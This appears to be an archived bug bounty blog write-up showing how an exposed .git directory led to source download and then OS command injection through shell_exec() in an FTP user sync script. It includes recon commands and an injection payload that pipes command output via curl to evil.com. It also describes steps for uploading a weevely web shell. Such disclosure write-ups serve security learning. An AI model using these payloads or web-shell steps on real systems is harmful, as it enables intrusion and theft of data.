---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-27_10000-bounty-for-exposed-git-to-rce.md
original_filename: 2023-02-27_10000-bounty-for-exposed-git-to-rce.md
title: $10.000 bounty for exposed .git to RCE
category: documents
detected_topics:
- command-injection
tags:
- imported
- documents
- command-injection
language: en
raw_sha256: 1b7d5fce3f59b064ff8d508d7ab0752ca46293fc36085c16a762d788b85e4eac
text_sha256: a4dd00499df54b015f512df3ead0a45aa5e3bd15992d62e459391f5139d6a981
ingested_at: '2026-06-28T07:32:18Z'
sensitivity: unknown
redactions_applied: false
---

# $10.000 bounty for exposed .git to RCE

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-27_10000-bounty-for-exposed-git-to-rce.md
- Source Type: markdown
- Detected Topics: command-injection
- Ingested At: 2026-06-28T07:32:18Z
- Redactions Applied: False
- Raw SHA256: `1b7d5fce3f59b064ff8d508d7ab0752ca46293fc36085c16a762d788b85e4eac`
- Text SHA256: `a4dd00499df54b015f512df3ead0a45aa5e3bd15992d62e459391f5139d6a981`


## Content

---
title: "$10.000 bounty for exposed .git to RCE"
url: "https://medium.com/@levshmelevv/10-000-bounty-for-exposed-git-to-rce-304c7e1f54"
authors: ["Lev Shmelev"]
bugs: [".git folder disclosure", "RCE", "OS command injection"]
bounty: "10,000"
publication_date: "2023-02-27"
added_date: "2023-02-28"
source: "pentester.land/writeups.json"
original_index: 1463
scraped_via: "browseros"
---

# $10.000 bounty for exposed .git to RCE

Top highlight

$10.000 bounty for exposed .git to RCE
Lev Shmelev
Follow
4 min read
·
Feb 27, 2023

1.4K

19

Press enter or click to view image in full size

Recently i participated in one of the private bugbounty programs where I managed to find RCE through the open .git directory on four hosts for which I received a record $10,000 and it would be a crime not to share it.
In fact, the vulnerability was as very simple and it took only half a day, but about everything in order…

The main stage of collecting low-hanging bugs is recon, for which I use a chain of tools in my bash script:

amass enum -active -d $1 -brute -w ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o amass.txt
cat amass.txt | aquatone -ports xlarge -out aqua_$1
nuclei -l aqua_$1/aquatone_urls.txt -t ~/nuclei-templates -es info -o nuclei_$1.txt

This is not the most detailed recon, you can add other tools at your discretion, but it is designed to scan a large amount of hosts

Fortunately, the output of nuclei showed me the exposed .git/ directories on several hosts through which it was possible to download the sources

To do this, use the git-dumper tool:

git-dumper http://example.com/.git/ output

I thought this was a great opportunity to look for serious issues in the code and did not rush to report exposed .git
And so it turned out that in the code they used a call to local bash scripts to save and delete ftp users via the shell_exec() function, which took an unfiltered userinput, which led to the RCE vulnerability

To craft the request, I also had to take into account a simple validation that required hardcoded secret keys

Press enter or click to view image in full size

And the final result of the request:

http://example.com/ftp-upload/sync.php?deluser=someuser&secret1=[secret1]&secret2=[sha1 encoded secret2]

Get Lev Shmelev’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

where the entry point will be the deluser parameter

Press enter or click to view image in full size

The next step was to validate the vulnerability itself, for which I made a test curl request to my server via injection into shell_exec(), which worked successfully

Press enter or click to view image in full size

It was also possible to read the output of commands by sending it either to the URI or via the POST body in base64 encoded form like that:

Payload for id command:
someusr; curl https://evil.com/$(id|base64|tr -d “\n”);

Press enter or click to view image in full size
Press enter or click to view image in full size

So it only remained to upload the shell, the only obstacle was the lack of write rights to the current directory, so the shell was uploaded to uploads/
(to generate the shell, I used the weevely tool)

Press enter or click to view image in full size

If describe this process in steps:

Save the shell locally in txt to be able to transfer it via curl, and raise the server on own host
Raise the tunnel with ngrok
Send a payload that will save our shell in uploads/shell.php

And it remains to connect to the uploaded shell using weevely

Press enter or click to view image in full size

After several days of help with fixing the issue, the company rewarded me with a bounty (motivational screenshot is attached;))

At the end, I want to say that in 9 out of 10 cases I did not receive anything, there were different companies that deceived me and it’s all about patience and consistency
Reach me on Linkedin
